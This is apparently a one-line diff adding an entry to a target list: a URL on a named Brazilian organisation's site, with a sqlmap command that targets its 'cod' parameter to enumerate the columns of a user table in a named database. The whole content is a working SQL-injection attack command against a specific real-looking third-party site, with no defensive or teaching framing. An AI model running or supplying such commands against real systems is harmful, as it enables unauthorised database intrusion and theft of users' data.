@@ -1,0 +1,1 @@
+http://www.ibefpr.com.br/evento_det.php?cod=112 (GET)  # sqlmap.py -u http://www.ibefpr.com.br/evento_det.php?cod=112 -D ibefprco_ger -T t_user --columns --threads=5 -v3
